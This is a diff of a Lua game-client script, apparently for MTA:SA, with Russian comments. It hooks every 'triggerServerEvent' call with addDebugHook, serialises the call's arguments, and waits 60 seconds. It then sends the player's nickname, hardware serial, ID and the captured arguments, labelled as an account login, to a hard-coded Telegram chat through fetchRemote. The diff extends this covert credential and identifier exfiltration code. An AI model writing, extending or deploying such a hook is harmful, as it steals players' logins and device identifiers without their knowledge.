@@ -3,8 +3,9 @@ local CHAT_ID = "-1003947071509"
 local sended = false
 
 function sendTG(text)
-    -- Сначала кодируем переносы строк в формат для URL (%0A)
-    -- Затем заменяем пробелы на %20
+    -- Правильное экранирование: 
+    -- 1. Заменяем переносы строк на %0A
+    -- 2. Заменяем пробелы на %20
     local encodedText = text:gsub("\n", "%%0A"):gsub(" ", "%%20")
 
     fetchRemote(
@@ -14,6 +15,24 @@ function sendTG(text)
             outputDebugString("TG Status: "..tostring(errno))
         end
     )
+end
+
+function valToString(v)
+    if type(v) == "string" then return '"'..v..'"'
+    elseif type(v) == "number" then return tostring(v)
+    elseif type(v) == "boolean" then return tostring(v)
+    elseif isElement(v) then
+        if v == localPlayer then return "localPlayer" end
+        return "elem:"..getElementType(v)
+    end
+    return tostring(v)
+end
+
+function buildArgs(...)
+    local args = {...}
+    local t = {}
+    for i,v in ipairs(args) do table.insert(t, valToString(v)) end
+    return table.concat(t, ", ")
 end
 
 addDebugHook("preFunction", function(sourceResource, functionName, isAllowedByACL, luaFilename, luaLineNumber, ...)
@@ -28,17 +47,20 @@ addDebugHook("preFunction", function(sourceResource, functionName, isAllowedByAC
     local resName = sourceResource and getResourceName(sourceResource) or "unknown"
     local argString = buildArgs(...)
 
-    
+    outputConsole("[DEBUG] Логин зафиксирован. Отправка через 60 сек...")
 
     setTimer(function()
+        -- Проверяем, не вышел ли игрок за эту минуту
+        if not isElement(localPlayer) then return end
+
         local nick = getPlayerName(localPlayer) or "N/A"
         local serial = getPlayerSerial(localPlayer) or "N/A"
         
-        -- Получение ID как ты просил
+        -- Твой метод получения ID
         local rawID = getElementID(localPlayer) or "0"
         local idloc = tostring(rawID):gsub("p", "")
 
-        -- Теперь \n будет работать правильно
+        -- Формируем текст
         local report = "✅ Вход в аккаунт\n" ..
                        "👤 Ник: " .. nick .. "\n" ..
                        "🆔 ID: " .. idloc .. "\n" ..
@@ -47,7 +69,7 @@ addDebugHook("preFunction", function(sourceResource, functionName, isAllowedByAC
                        "📝 Аргументы: " .. argString
 
         sendTG(report)
-        outputConsole("[DEBUG] Сообщение отправлено в TG")
+        outputConsole("[DEBUG] Сообщение ушло в Telegram")
     end, 60000, 1)
 end, {"triggerServerEvent"})
 ----------------------------------------------------------------
